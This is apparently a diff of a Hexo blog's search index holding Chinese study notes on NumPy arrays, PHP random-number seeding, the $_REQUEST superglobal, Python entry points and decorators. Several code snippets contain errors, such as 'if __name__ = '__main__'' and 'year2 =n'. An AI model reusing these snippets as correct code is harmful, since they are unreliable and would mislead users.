-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1 2 3]</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p> 示例 2：创建二维数组，指定<code>ndmin=2</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr2 = np.array(data, ndmin=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(arr2)</span><br><span class="line"><span class="built_in">print</span>(arr2.ndim)</span><br></pre></td></tr></table></figure>
-
-<p>这里<code>data</code>还是一维的列表，但通过设置<code>ndmin=2</code>，NumPy 会在前面添加一个维度，将其转换为二维数组。输出结果为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[1 2 3]]</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，原本的一维列表被包装成了一个只有一行的二维数组。</p>
-<p> 示例 3：创建三维数组，指定<code>ndmin=3</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr3 = np.array(data, ndmin=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(arr3)</span><br><span class="line"><span class="built_in">print</span>(arr3.ndim)</span><br></pre></td></tr></table></figure>
-
-<p>此时<code>data</code>依旧是一维列表，由于<code>ndmin=3</code>，NumPy 会添加两个维度，生成一个三维数组。输出如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[[1 2 3]]]</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
-
-<p>它变成了一个只有一个 “切片” 的三维数组。</p>
-<p>示例 4：已有高维数据，指定<code>ndmin</code>小于其维度</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">data = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]]  <span class="comment"># 二维列表</span></span><br><span class="line">arr4 = np.array(data, ndmin=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(arr4)</span><br><span class="line"><span class="built_in">print</span>(arr4.ndim)</span><br></pre></td></tr></table></figure>
-
-<p>这里<code>data</code>是二维列表，虽然指定<code>ndmin=1</code>，但因为原始数据已经是二维，所以<code>arr4</code>还是二维数组，<code>ndmin</code>不会改变高于它指定值的维度。输出为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[1 2]</span><br><span class="line"> [3 4]]</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
-
-<p>通过这些例子可以看出，<code>ndmin</code>参数在需要确保生成的 NumPy 数组具有特定最小维度时非常有用，常用于数据预处理等场景</p>
-</li>
-</ul>
-<ul>
-<li><strong>形状（shape）</strong>：表示数组在每个维度上的大小，是一个元组。例如，二维数组 <code>[[1, 2, 3], [4, 5, 6]]</code> 的形状是 <code>(2, 3)</code>，表示有 2 行 3 列。可以使用数组的 <code>shape</code> 属性获取形状信息。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">two_d = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二维数组的形状:&quot;</span>, two_d.shape)  <span class="comment"># 输出: (2, 3)</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="索引与切片"><a href="#索引与切片" class="headerlink" title="索引与切片"></a>索引与切片</h3><p>多维数组的索引和切片操作与一维数组类似，但需要考虑多个维度</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">two_d = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问单个元素</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;访问第 1 行第 2 列的元素:&quot;</span>, two_d[<span class="number">0</span>, <span class="number">1</span>])  <span class="comment"># 输出: 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切片操作</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;获取第一行的所有元素:&quot;</span>, two_d[<span class="number">0</span>, :])  <span class="comment"># 输出: [1 2 3]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;获取第一列的所有元素:&quot;</span>, two_d[:, <span class="number">0</span>])  <span class="comment"># 输出: [1 4]</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>多维数组在数据分析、机器学习、图像处理等领域有广泛应用。例如，在图像处理中，一张彩色图像可以用三维数组表示，其中前两个维度表示图像的高度和宽度，第三个维度表示颜色通道（如红、绿、蓝）。</p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>numpy库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php比较字符1</title>
-    <url>/2025/01/11/php%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A61/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php比较字符</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php命令执行函数详解</title>
     <url>/2025/01/13/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<h3 id="首先辨析-system-passthru"><a href="#首先辨析-system-passthru" class="headerlink" title="首先辨析:system,passthru"></a>首先辨析:system,passthru</h3><p>1.对于system和passthru函数.</p>
@@ -1867,41 +1856,6 @@ int main()&#123;
       </categories>
       <tags>
         <tag>命令执行函数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php超全局变量</title>
-    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7%E6%B3%A8%E8%A7%A3/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>php随机数的解释</title>
-    <url>/2025/01/13/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
-    <content><![CDATA[<h4 id="mt-rand-函数对mt-srand-函数的继承"><a href="#mt-rand-函数对mt-srand-函数的继承" class="headerlink" title="mt_rand()函数对mt_srand()函数的继承"></a>mt_rand()函数对mt_srand()函数的继承</h4><p>如图下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 会输出与第一次使用 mt_srand(1) 后 mt_rand() 生成的第一个数相同的数</span></span><br></pre></td></tr></table></figure>
-<p>mt_srand()函数是用来设置随机数种子的，在第一个mt_rand函数调用后,会再次生成一个随机数,<br>在第二个mt_rand函数调用后,会根据第一次的随机数再次生成另一个随机数,以此类推。<br>而到了mt_srand(1)后,随机数种子被重置,<br>所以在第二次使用mt_srand播种后在下面那个mt_rand()调用中,会会生成与第一次生成的随机数相同的数。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php随机数函数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php超全局变量特性注解</title>
-    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/</url>
-    <content><![CDATA[<h3 id="php超全局变量特性注解"><a href="#php超全局变量特性注解" class="headerlink" title="php超全局变量特性注解"></a>php超全局变量特性注解</h3><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>1.它最大的特点就是,$_REQUEST超全局变量为一个复合变量,它可以接受来自于$_GET、$_POST 和 $_COOKIE 传递过来的值。<br>2.它的设计初衷是为了方便开发者在处理用户输入时，无需关心数据是通过哪种方式提交的，都能统一获取。<br>3.所以如下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&quot;file&quot;</span>];</span><br></pre></td></tr></table></figure>
-<p>我们直接在url里面加上:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=xxx</span><br></pre></td></tr></table></figure>
-<p>就可以让$_REQUEST变量接收到传递的参数。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php超全局变量</tag>
       </tags>
   </entry>
   <entry>
@@ -1924,6 +1878,52 @@ int main()&#123;
       </categories>
       <tags>
         <tag>php字符串处理函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php比较字符1</title>
+    <url>/2025/01/11/php%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A61/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php比较字符</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php超全局变量特性注解</title>
+    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/</url>
+    <content><![CDATA[<h3 id="php超全局变量特性注解"><a href="#php超全局变量特性注解" class="headerlink" title="php超全局变量特性注解"></a>php超全局变量特性注解</h3><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>1.它最大的特点就是,$_REQUEST超全局变量为一个复合变量,它可以接受来自于$_GET、$_POST 和 $_COOKIE 传递过来的值。<br>2.它的设计初衷是为了方便开发者在处理用户输入时，无需关心数据是通过哪种方式提交的，都能统一获取。<br>3.所以如下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&quot;file&quot;</span>];</span><br></pre></td></tr></table></figure>
+<p>我们直接在url里面加上:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=xxx</span><br></pre></td></tr></table></figure>
+<p>就可以让$_REQUEST变量接收到传递的参数。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php超全局变量</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php超全局变量</title>
+    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7%E6%B3%A8%E8%A7%A3/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>php随机数的解释</title>
+    <url>/2025/01/13/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
+    <content><![CDATA[<h4 id="mt-rand-函数对mt-srand-函数的继承"><a href="#mt-rand-函数对mt-srand-函数的继承" class="headerlink" title="mt_rand()函数对mt_srand()函数的继承"></a>mt_rand()函数对mt_srand()函数的继承</h4><p>如图下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 会输出与第一次使用 mt_srand(1) 后 mt_rand() 生成的第一个数相同的数</span></span><br></pre></td></tr></table></figure>
+<p>mt_srand()函数是用来设置随机数种子的，在第一个mt_rand函数调用后,会再次生成一个随机数,<br>在第二个mt_rand函数调用后,会根据第一次的随机数再次生成另一个随机数,以此类推。<br>而到了mt_srand(1)后,随机数种子被重置,<br>所以在第二次使用mt_srand播种后在下面那个mt_rand()调用中,会会生成与第一次生成的随机数相同的数。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php随机数函数</tag>
       </tags>
   </entry>
   <entry>
@@ -1963,6 +1963,11 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
+    <title>python常见bug</title>
+    <url>/2025/03/18/python%E5%B8%B8%E8%A7%81bug/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>python异常捕获及处理</title>
     <url>/2025/01/29/python%E5%BC%82%E5%B8%B8%E6%8D%95%E8%8E%B7%E5%8F%8A%E5%A4%84%E7%90%86/</url>
     <content><![CDATA[<h1 id="Python异常捕获与处理"><a href="#Python异常捕获与处理" class="headerlink" title="Python异常捕获与处理"></a>Python异常捕获与处理</h1><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><p>例如:</p>
@@ -1999,85 +2004,6 @@ int main()&#123;
       <tags>
         <tag>python异常</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>python常见bug</title>
-    <url>/2025/03/18/python%E5%B8%B8%E8%A7%81bug/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>python程序运行启动代码</title>
-    <url>/2025/01/26/python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%90%AF%E5%8A%A8%E4%BB%A3%E7%A0%81/</url>
-    <content><![CDATA[<h1 id="常规程序启动入口"><a href="#常规程序启动入口" class="headerlink" title="常规程序启动入口"></a>常规程序启动入口</h1><h2 id="name-启动程序"><a href="#name-启动程序" class="headerlink" title="__name__启动程序"></a><code>__name__</code>启动程序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    data : <span class="built_in">dict</span> = load_toml()</span><br><span class="line">    pprint(data,sort_dics=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="代码逐行解释"><a href="#代码逐行解释" class="headerlink" title="代码逐行解释"></a>代码逐行解释</h3><h4 id="if-name-main"><a href="#if-name-main" class="headerlink" title="if __name__ == &#39;__main__&#39;:"></a><code>if __name__ == &#39;__main__&#39;:</code></h4><ul>
-<li><p><code>__name__</code> 变量：</p>
-</li>
-<li><p>在 Python 中，每个模块（即<code>.py</code>文件）都有一个内置的<code>__name__</code>变量。这个变量的值取决于模块是如何被使用的。</p>
-<ul>
-<li><strong>当一个 Python 脚本作为主程序直接运行时</strong>，例如<strong>在命令行中使用 <code>python script.py</code> 来执行脚本</strong>，该脚本的 <code>__name__</code> 变量会被自动设置为 <code>&#39;__main__&#39;</code>。</li>
-<li><strong>当一个 Python 脚本作为模块被其他脚本导入时</strong>，例如在 <code>another_script.py</code> 中使用 <code>import script</code>，那么 <code>script.py</code> 模块的 <code>__name__</code> 变量会被设置为该模块的名称（即 <code>&#39;script&#39;</code>）。</li>
-</ul>
-</li>
-<li><p><strong>条件判断</strong>：<code>if __name__ == &#39;__main__&#39;:</code> 这行代码的作用是检查当前脚本是否作为主程序直接运行。如果是，则执行下面缩进的代码块；如果脚本是作为模块被导入到其他脚本中，则不会执行该代码块。这种机制允许我们在一个脚本中既定义可复用的函数和类，又可以包含用于测试或直接执行的代码，同时避免在被导入时执行这些测试代码。</p>
-</li>
-</ul>
-<h4 id="data-dict-load-toml"><a href="#data-dict-load-toml" class="headerlink" title="data: dict = load_toml()"></a><code>data: dict = load_toml()</code></h4><ul>
-<li><strong>类型注解</strong>：<code>data: dict</code> 是 Python 的类型注解，它告诉开发者（以及一些静态类型检查工具，如 <code>mypy</code>）变量 <code>data</code> 预期的类型是字典（<code>dict</code>）。类型注解不会影响代码的实际运行，但可以提高代码的可读性和可维护性。</li>
-<li><strong>函数调用</strong>：<code>load_toml()</code> 是之前定义的函数，用于读取并解析 <code>config.toml</code> 文件。调用该函数会返回一个包含解析后 TOML 数据的字典，这个字典会被赋值给变量 <code>data</code>。</li>
-</ul>
-<h4 id="pprint-data-sort-dicts-False"><a href="#pprint-data-sort-dicts-False" class="headerlink" title="pprint(data, sort_dicts=False)"></a><code>pprint(data, sort_dicts=False)</code></h4><ul>
-<li><strong><code>pprint</code> 函数</strong>：<code>pprint</code> 是 Python 标准库 <code>pprint</code> 模块中的一个函数，用于以美观的格式打印复杂的数据结构，如嵌套的字典和列表。相比于普通的 <code>print</code> 函数，<code>pprint</code> 会对数据进行格式化，使其更易于阅读。</li>
-<li><strong><code>sort_dicts=False</code> 参数</strong>：在 Python 3.8 及以上版本中，<code>pprint</code> 函数默认会对字典的键进行排序后再打印。通过设置 <code>sort_dicts=False</code>，我们告诉 <code>pprint</code> 函数不要对字典的键进行排序，**(其实就是对字典的键按照字母顺序排序)**而是按照字典中键的原始顺序进行打印。这样可以保留 TOML 文件中键值对的原始顺序。即没有用字母顺序排序。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>py程序启动</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python装饰器</title>
-    <url>/2025/03/20/python%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
-    <content><![CDATA[<h1 id="classmethod"><a href="#classmethod" class="headerlink" title="@classmethod"></a>@classmethod</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><ul>
-<li><p><code>@classmethod</code> 是 Python 中的一个装饰器，作用是把一个方法封装成类方法 。</p>
-</li>
-<li><p>类方法是什么，就是可以直接使用类，无需实例化调用的方法叫做类方法。</p>
-</li>
-<li><p>比如:</p>
-</li>
-<li><pre><code class="language-python">class DateUtils:    
-    @classmethod
-    def get_time(cls):
-        import datetime
-        return datetime.datetime.now()
- 
-#类调用
-year1 = DateUtils.get_time
-print(year1)
-
-#实例化后调用
-date = DateUtils()
-year2 =n date.get_time
-print(year2)
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># @model_validator(mode=&quot;&quot;)(pydantic库)</span><br><span class="line"></span><br><span class="line">## 可输入参数:</span><br><span class="line"></span><br><span class="line">* `before`和`after`</span><br><span class="line"></span><br><span class="line">* 区别如下:</span><br><span class="line"></span><br><span class="line">  - `@model_validator(mode=&quot;before&quot;)` 在`pydantic`模型进行内置类型和约束验证前执行 ，处理的是原始输入数据，通常为字典形式。可以对数据进行转换，如将字符串转为数字，还能进行数据清理等操作，之后返回处理过的字典供后续验证。比如输入的日期是多种字符串格式，可在`before`验证中统一转换为指定日期格式。</span><br><span class="line"></span><br><span class="line">  - `@model_validator(mode=&quot;after&quot;)` 在模型完成内置验证后执行，此时面对的是已经初步验证通过的模型实例对象，不能对数据来源进行转换，但能基于完整的实例对象做进一步检查。</span><br><span class="line"></span><br><span class="line">  - 通俗地来说`@model_validator`中参数为`before`时该模型中的检查方法更倾向于对输入格式的检查和转换</span><br><span class="line"></span><br><span class="line">  - 而后者，即参数为`after`的时候，更加倾向于在数据格式都毫无疑问的时候，单纯对数据大小关系进行检查，其重点没有放在格式上面，而是数值关系，所以叫`after`。</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    from pydantic import BaseModel, model_validator</span><br><span class="line">    </span><br><span class="line">    class TimeInterval(BaseModel):</span><br><span class="line">        start_time: int</span><br><span class="line">        end_time: int</span><br><span class="line">    </span><br><span class="line">        @model_validator(mode=&quot;after&quot;)</span><br><span class="line">        def check_time_order(cls, instance):</span><br><span class="line">            if instance.start_time &gt;= instance.end_time:</span><br><span class="line">                raise ValueError(&quot;开始时间必须早于结束时间&quot;)</span><br><span class="line">            return instance</span><br><span class="line">    </span><br><span class="line">    # 测试</span><br><span class="line">    try:</span><br><span class="line">        time_data = &#123;&quot;start_time&quot;: 1672531200, &quot;end_time&quot;: 1672534800&#125;#直接验证数值大小</span><br><span class="line">        time_interval = TimeInterval(**time_data)</span><br><span class="line">        print(time_interval)</span><br><span class="line">    except ValueError as e:</span><br><span class="line">        print(f&quot;验证失败: &#123;e&#125;&quot;)</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python装饰器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>re库</title>
-    <url>/2025/03/01/re%E5%BA%93/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>python杂项函数/用法积累(持续更新)</title>
@@ -2199,6 +2125,75 @@ print(year2)
       </tags>
   </entry>
   <entry>
+    <title>python装饰器</title>
+    <url>/2025/03/20/python%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
+    <content><![CDATA[<h1 id="classmethod"><a href="#classmethod" class="headerlink" title="@classmethod"></a>@classmethod</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><ul>
+<li><p><code>@classmethod</code> 是 Python 中的一个装饰器，作用是把一个方法封装成类方法 。</p>
+</li>
+<li><p>类方法是什么，就是可以直接使用类，无需实例化调用的方法叫做类方法。</p>
+</li>
+<li><p>比如:</p>
+</li>
+<li><pre><code class="language-python">class DateUtils:    
+    @classmethod
+    def get_time(cls):
+        import datetime
+        return datetime.datetime.now()
+ 
+#类调用
+year1 = DateUtils.get_time
+print(year1)
+
+#实例化后调用
+date = DateUtils()
+year2 =n date.get_time
+print(year2)
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># @model_validator(mode=&quot;&quot;)(pydantic库)</span><br><span class="line"></span><br><span class="line">## 可输入参数:</span><br><span class="line"></span><br><span class="line">* `before`和`after`</span><br><span class="line"></span><br><span class="line">* 区别如下:</span><br><span class="line"></span><br><span class="line">  - `@model_validator(mode=&quot;before&quot;)` 在`pydantic`模型进行内置类型和约束验证前执行 ，处理的是原始输入数据，通常为字典形式。可以对数据进行转换，如将字符串转为数字，还能进行数据清理等操作，之后返回处理过的字典供后续验证。比如输入的日期是多种字符串格式，可在`before`验证中统一转换为指定日期格式。</span><br><span class="line"></span><br><span class="line">  - `@model_validator(mode=&quot;after&quot;)` 在模型完成内置验证后执行，此时面对的是已经初步验证通过的模型实例对象，不能对数据来源进行转换，但能基于完整的实例对象做进一步检查。</span><br><span class="line"></span><br><span class="line">  - 通俗地来说`@model_validator`中参数为`before`时该模型中的检查方法更倾向于对输入格式的检查和转换</span><br><span class="line"></span><br><span class="line">  - 而后者，即参数为`after`的时候，更加倾向于在数据格式都毫无疑问的时候，单纯对数据大小关系进行检查，其重点没有放在格式上面，而是数值关系，所以叫`after`。</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    from pydantic import BaseModel, model_validator</span><br><span class="line">    </span><br><span class="line">    class TimeInterval(BaseModel):</span><br><span class="line">        start_time: int</span><br><span class="line">        end_time: int</span><br><span class="line">    </span><br><span class="line">        @model_validator(mode=&quot;after&quot;)</span><br><span class="line">        def check_time_order(cls, instance):</span><br><span class="line">            if instance.start_time &gt;= instance.end_time:</span><br><span class="line">                raise ValueError(&quot;开始时间必须早于结束时间&quot;)</span><br><span class="line">            return instance</span><br><span class="line">    </span><br><span class="line">    # 测试</span><br><span class="line">    try:</span><br><span class="line">        time_data = &#123;&quot;start_time&quot;: 1672531200, &quot;end_time&quot;: 1672534800&#125;#直接验证数值大小</span><br><span class="line">        time_interval = TimeInterval(**time_data)</span><br><span class="line">        print(time_interval)</span><br><span class="line">    except ValueError as e:</span><br><span class="line">        print(f&quot;验证失败: &#123;e&#125;&quot;)</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python装饰器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python程序运行启动代码</title>
+    <url>/2025/01/26/python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%90%AF%E5%8A%A8%E4%BB%A3%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="常规程序启动入口"><a href="#常规程序启动入口" class="headerlink" title="常规程序启动入口"></a>常规程序启动入口</h1><h2 id="name-启动程序"><a href="#name-启动程序" class="headerlink" title="__name__启动程序"></a><code>__name__</code>启动程序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    data : <span class="built_in">dict</span> = load_toml()</span><br><span class="line">    pprint(data,sort_dics=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码逐行解释"><a href="#代码逐行解释" class="headerlink" title="代码逐行解释"></a>代码逐行解释</h3><h4 id="if-name-main"><a href="#if-name-main" class="headerlink" title="if __name__ == &#39;__main__&#39;:"></a><code>if __name__ == &#39;__main__&#39;:</code></h4><ul>
+<li><p><code>__name__</code> 变量：</p>
+</li>
+<li><p>在 Python 中，每个模块（即<code>.py</code>文件）都有一个内置的<code>__name__</code>变量。这个变量的值取决于模块是如何被使用的。</p>
+<ul>
+<li><strong>当一个 Python 脚本作为主程序直接运行时</strong>，例如<strong>在命令行中使用 <code>python script.py</code> 来执行脚本</strong>，该脚本的 <code>__name__</code> 变量会被自动设置为 <code>&#39;__main__&#39;</code>。</li>
+<li><strong>当一个 Python 脚本作为模块被其他脚本导入时</strong>，例如在 <code>another_script.py</code> 中使用 <code>import script</code>，那么 <code>script.py</code> 模块的 <code>__name__</code> 变量会被设置为该模块的名称（即 <code>&#39;script&#39;</code>）。</li>
+</ul>
+</li>
+<li><p><strong>条件判断</strong>：<code>if __name__ == &#39;__main__&#39;:</code> 这行代码的作用是检查当前脚本是否作为主程序直接运行。如果是，则执行下面缩进的代码块；如果脚本是作为模块被导入到其他脚本中，则不会执行该代码块。这种机制允许我们在一个脚本中既定义可复用的函数和类，又可以包含用于测试或直接执行的代码，同时避免在被导入时执行这些测试代码。</p>
+</li>
+</ul>
+<h4 id="data-dict-load-toml"><a href="#data-dict-load-toml" class="headerlink" title="data: dict = load_toml()"></a><code>data: dict = load_toml()</code></h4><ul>
+<li><strong>类型注解</strong>：<code>data: dict</code> 是 Python 的类型注解，它告诉开发者（以及一些静态类型检查工具，如 <code>mypy</code>）变量 <code>data</code> 预期的类型是字典（<code>dict</code>）。类型注解不会影响代码的实际运行，但可以提高代码的可读性和可维护性。</li>
+<li><strong>函数调用</strong>：<code>load_toml()</code> 是之前定义的函数，用于读取并解析 <code>config.toml</code> 文件。调用该函数会返回一个包含解析后 TOML 数据的字典，这个字典会被赋值给变量 <code>data</code>。</li>
+</ul>
+<h4 id="pprint-data-sort-dicts-False"><a href="#pprint-data-sort-dicts-False" class="headerlink" title="pprint(data, sort_dicts=False)"></a><code>pprint(data, sort_dicts=False)</code></h4><ul>
+<li><strong><code>pprint</code> 函数</strong>：<code>pprint</code> 是 Python 标准库 <code>pprint</code> 模块中的一个函数，用于以美观的格式打印复杂的数据结构，如嵌套的字典和列表。相比于普通的 <code>print</code> 函数，<code>pprint</code> 会对数据进行格式化，使其更易于阅读。</li>
